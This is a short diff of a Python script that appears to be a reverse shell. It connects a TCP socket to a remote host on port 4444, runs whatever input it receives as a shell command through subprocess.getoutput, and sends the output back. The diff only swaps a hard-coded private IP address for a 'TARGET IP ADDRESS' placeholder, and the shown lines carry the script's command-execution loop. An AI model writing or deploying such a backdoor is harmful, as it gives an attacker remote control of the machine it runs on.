@@ -2,7 +2,7 @@ import socket as sk, subprocess, sys
 
 sk = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
 
-RHOST = "10.22.225.106"
+RHOST = "TARGET IP ADDRESS"
 RPORT = 4444
 
 try:
@@ -20,5 +20,6 @@ while True:
         break
     output = subprocess.getoutput(input)
     sk.send(output.encode())
+
 
 sk.close()
